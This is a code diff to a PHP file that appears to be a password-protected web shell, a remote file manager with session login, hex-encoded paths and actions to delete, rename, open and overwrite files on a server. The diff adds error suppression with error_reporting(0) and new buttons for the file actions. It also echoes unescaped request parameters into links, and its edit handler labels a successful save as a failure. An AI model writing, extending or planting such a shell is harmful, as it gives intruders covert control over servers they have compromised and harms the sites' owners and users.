@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0);
 session_start();
 set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
@@ -106,7 +106,7 @@ if (!isset($_SESSION['login'])) {
 		color: #000;
 	}
 	div.container {
-		margin:100px;
+		margin:20px;
 		width:80%;
 		text-align:left;
 	}
@@ -979,32 +979,38 @@ if (!isset($_SESSION['login'])) {
 			}
 			switch (@$_POST['action']) {
 				case 'delete':
-					x::delete($_POST['file']);
+					if (x::delete($_POST['file'])) {
+						print("<script>alert('<h3>success</h3>')</script>");
+					} else {
+						print("<script>alert('<h3>permission danied</h3>')</script>");
+					}
 					break;
 				case 'chname':
 					if (isset($_POST['chname'])) {
 						if (x::chname($_POST['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
-							print("<script>alert('success')</script>");
+							print("<script>alert('<h3>success</h3>')</script>");
 						} else {
-							print("<script>alert('failed')</script>");
+							print("<script>alert('<h3>failed</h3>')</script>");
 						}
 					}
 					switch ($_POST['file']) {
 						case is_dir($_POST['file']):
 							?>
 							<div class="chname">
-								<table width="100%">
+								<table width="100%" class="chname">
 									<tr>
 										<td style="width:1;" class="edit-header">
 											<a href="?cd=<?= $_GET['cd'] ?>">
 												<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
 											</a>
 										</td>
-										<td class="action" colspan="2">CHANGE NAME</td>
+										<td class="action" colspan="2">
+											<span>CHANGE NAME</span>
+										</td>
 									</tr>
 									<tr>
 										<td style="width:120px;">
-											Dirname
+											Filename
 										</td>
 										<td>:</td>
 										<td>
@@ -1017,7 +1023,7 @@ if (!isset($_SESSION['login'])) {
 										</td>
 										<td>:</td>
 										<td>
-											<?= filetype($_POST['file']) ?> 
+											<?= filetype($_POST['file']) ?>  
 											<i><?= x::countDir($_POST['file']) ?> items</i>
 										</td>
 									</tr>
@@ -1029,6 +1035,27 @@ if (!isset($_SESSION['login'])) {
 										<td>
 											<?= x::ftime($_POST['file']) ?>
 										</td>
+									</tr>
+									<tr>
+										<form method="post" action="?cd=<?= $_GET['cd'] ?>">
+											<td colspan="3">
+												<div class="button">
+													<button name="action" value="edit">
+														<i class="far fa-edit" title="Edit"></i>&nbsp;
+														Open
+													</button>
+													<button disabled name="action" value="chname" title="Rename">
+														<i class="fa fa-magic" aria-hidden="true"></i>&nbsp;
+														Rename
+													</button>
+													<button name="action" value="delete" title="Delete">
+														<i class="fa fa-times"></i>&nbsp;
+														Delete
+													</button>
+												</div>
+											</td>
+										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+										</form>
 									</tr>
 									<form method="post">
 										<tr>
@@ -1139,9 +1166,9 @@ if (!isset($_SESSION['login'])) {
 				case 'edit':
 					if (isset($_POST['edit'])) {
 						if (x::save($_POST['file'], $_POST['data'], 'save', 'w')) {
-							print("<script>alert('failed')</script>");
+							print("<script>alert('<h3>failed</h3>')</script>");
 						} else {
-							print("<script>alert('success')</script>");
+							print("<script>alert('<h3>success</h3>')</script>");
 						}
 					}
 					?>
